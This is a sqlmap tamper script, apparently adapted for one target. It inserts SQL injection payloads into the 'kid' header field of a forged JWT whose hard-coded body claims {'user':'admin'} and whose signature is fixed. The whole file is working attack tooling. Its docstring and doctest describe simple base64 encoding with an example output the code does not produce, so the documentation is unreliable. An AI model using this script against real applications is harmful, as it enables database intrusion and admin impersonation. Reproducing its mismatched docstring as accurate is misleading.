#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import base64

from lib.core.convert import encodeBase64
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Base64-encodes all characters in a given payload

    >>> tamper("1' AND SLEEP(5)#")
    'MScgQU5EIFNMRUVQKDUpIw=='
    """
    _str = '{"typ":"JWT","alg":"HS256","kid":"' + payload + '"}'
    _str = base64.b64encode(_str).replace("=", "")
    _str = _str + ".eyJ1c2VyIjoiYWRtaW4ifQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"

    return _str
